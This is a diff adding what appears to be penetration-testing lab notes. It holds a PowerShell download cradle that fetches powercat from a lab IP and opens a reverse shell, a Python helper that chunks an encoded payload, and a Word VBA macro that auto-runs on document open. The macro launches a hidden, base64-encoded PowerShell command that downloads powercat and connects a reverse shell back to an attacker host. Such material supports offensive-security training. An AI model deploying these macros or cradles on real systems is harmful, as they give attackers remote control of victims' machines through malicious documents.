@@ -1,0 +1,41 @@
+# Download cradle
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+
+# Splitting
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+
+
+# macro example:
+
+Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+'
+' MyMacro Macro
+'
+'
+    Dim Str As String
+Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
+Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
+Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC40NS4yMzMvcG93ZXJjYXQucHM"
+Str = Str + "xJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yMzMgLXAgNDQ0N"
+Str = Str + "CAtZSBwb3dlcnNoZWxsCg=="
+
+'    CreateObject("Wscript.Shell").Run "powershell"
+        CreateObject("Wscript.Shell").Run Str
+End Sub
